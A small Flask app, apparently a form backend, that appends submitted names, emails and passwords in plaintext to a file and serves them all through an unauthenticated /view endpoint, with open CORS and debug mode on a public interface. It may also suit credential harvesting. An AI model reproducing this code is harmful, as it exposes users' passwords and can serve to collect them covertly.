from flask import Flask, request, jsonify, redirect
import os

app = Flask(__name__)

try:
    from flask_cors import CORS
    CORS(app)
except ImportError:
    pass

@app.route('/submit', methods=['POST'])
def submit():
    name = request.form.get('name', 'N/A')
    email = request.form.get('email', 'N/A')
    password = request.form.get('password', 'N/A')

    with open('names.txt', 'a') as f:
        f.write(f'Name: {name}, Email: {email}, Password: {password}\n')

    return redirect("/submit-success")

@app.route('/view', methods=['GET'])
def view():
    try:
        with open('names.txt', 'r') as file:
            lines = file.readlines()
        return jsonify({"entries": lines}), 200
    except FileNotFoundError:
        return jsonify({"error": "Data file not found"}), 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
